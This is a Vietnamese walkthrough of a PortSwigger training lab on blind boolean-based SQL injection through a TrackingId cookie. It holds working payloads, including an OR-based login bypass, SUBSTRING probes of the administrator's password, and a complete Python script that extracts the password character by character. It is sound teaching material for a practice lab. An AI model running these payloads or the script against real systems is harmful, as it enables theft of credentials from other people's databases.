![image](https://github.com/user-attachments/assets/cf3cd172-0285-4229-a592-c71ba52b8fce)

![image](https://github.com/user-attachments/assets/d29f71fd-9470-45b7-a3f6-aeaba961016d)

Đây là bài lab khi ta bắt đầu. Nếu đúng thì nó sẽ luôn trả về data.

Dù ta có nháy đơn hay nháy kép kiểu gì thì nó cũng k cho ta dấu hiệu gì hết.

Vậy thì nó là blind rồi. Tiến hành check dựa vào boolen based

![image](https://github.com/user-attachments/assets/e033b939-01b9-417b-bd74-912902b7b37e)

![image](https://github.com/user-attachments/assets/d42d3e5d-922a-4e15-ad93-8e9e633ca1ba)

Dựa vào đây thì ta có thể biết chắc chắn được nó bị sqli rồi và nếu như bạn có thắc mắc là tại sao dùng `and` mà không dùng `or` ??. Câu trả lời là hoàn toàn được nhé.

Nếu dùng or thì bạn cần phải tìm data không có trong sql table thì khi đó bạn or thì mới biết nó có tác dụng

Ví dụ dễ hiểu sẽ là:

```
-999' or 1 = 1 --+
```

Thì nếu như select vào 1 data không tồn tại như này mà kết quả nó vẫn phản hồi ra gì đó thì bạn biết là nó bị sqli rồi còn gì, bởi or là chỉ cần 1 vế đúng thì sẽ select được còn gì.

vì vậy theo tôi cả 2 đều đúng. Và nếu sử dụng thì tôi rcm `and` vì nó khá trực quan và dễ hiểu. Còn `or` thì thường dùng để bypass login. Nói chung là cứ tùy trường hợp nhé, k cần cứng nhắc phải theo cái gì đó.

![image](https://github.com/user-attachments/assets/d045caac-cafb-4813-8540-7de80c9769d0)

Tiến hành check xem bảng users có tồn tại hay không.

Tại sao lại check như này. thì ta quay lại với sql syntax nhé.

![image](https://github.com/user-attachments/assets/17e84d4f-bdf2-4c70-89b1-7b7a10121c20)

Đó nếu bảng đó tồn tại thì nó sẽ là như này.

![image](https://github.com/user-attachments/assets/e32d122a-98a5-4e45-8b33-e165f1d65558)

Nếu bảng không tồn tại thì nó sẽ là như này. vì đó chỉ là select chuỗi nên là chuối k quan trọng khi nào không có `'` thì mới là truy vấn column

Nhớ nhé, vậy là ta đã check được bảng users có tồn tại.

Kiểm tra xem administrator có trong bảng users không.

![image](https://github.com/user-attachments/assets/b3ac3ef5-5f8c-44b8-99b0-3aa73797eec3)

Vậy là có tồn tại.

![image](https://github.com/user-attachments/assets/82267cc7-4fdc-41b0-9b9d-3078e23c8a00)

![image](https://github.com/user-attachments/assets/5565e3e0-0c1f-428a-9344-0409d4ef49fd)

Thử tiếp với >2, >3, … cho đến khi "Welcome back" biến mất, ta xác định được mật khẩu dài 20 ký tự.

![image](https://github.com/user-attachments/assets/c7518b27-8543-4686-a21b-4063b70757ae)

Vậy là tôi đã biết kí tự đầu tiên bắt đầu bằng chữ y. tiến hành bruteforce tiếp.

Payload:

```
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```

Tiếp tục như vậy nhé.

Nhưng tôi là người lười, nên sẽ viết script để chạy v:

Đây là script của tôi. python nó chạy hơi chậm á, nếu muốn nhanh thì bạn cứ bruteforce = intruder rồi ghép lại.

```
import requests
import string

# Cấu hình request
URL = "https://0abb009b04d0e82284dd5fad00b400cd.web-security-academy.net/filter?category=Pets"
BASE_TRACKING_ID = "PF5r86UIm4PzfbU2"
COOKIES = {"session": "BN2PtienwI7n7n1r6ZajVzIzOFDSzD3d"}
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.60 Safari/537.36",
    "Referer": "https://0abb009b04d0e82284dd5fad00b400cd.web-security-academy.net/"
}

# Bộ ký tự cần thử: a-z, A-Z, 0-9
CHARSET = string.ascii_letters + string.digits  # "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

def is_correct_guess(response):
    """ Kiểm tra nếu response có chứa 'Welcome back' (hoặc dấu hiệu khác của server). """
    return "Welcome back" in response.text  # Cần kiểm tra response thực tế từ server để chắc chắn

def brute_force_password():
    password = ""

    for i in range(1, 50):  # Giả sử password có tối đa 50 ký tự
        found = False
        for char in CHARSET:
            # Inject SQL để kiểm tra ký tự thứ i của password
            payload = f"{BASE_TRACKING_ID}' AND (SELECT SUBSTRING(password,{i},1) FROM users WHERE username='administrator')='{char}"
            COOKIES["TrackingId"] = payload

            print(f"[*] Đang thử ký tự thứ {i}: {char}")  # Debug

            response = requests.get(URL, cookies=COOKIES, headers=HEADERS)

            if is_correct_guess(response):
                password += char
                print(f"[+] Ký tự đúng: {char} --> {password}")
                found = True
                break
        
        if not found:
            print(f"[*] Password hoàn chỉnh: {password}")
            break

    return password

# Chạy script
final_password = brute_force_password()
print(f"Password cuối cùng: {final_password}")
```

![image](https://github.com/user-attachments/assets/157604a8-58e6-42eb-bee3-72c5c820c38f)

Và cứ tiếp tục như thế sẽ ra mật khẩu cuối cùng.

![image](https://github.com/user-attachments/assets/14c7b8d7-c957-4373-a9b1-c6163ca58a86)

Và sẽ thành công. Và tôi cũng đã làm bằng 2 cách.


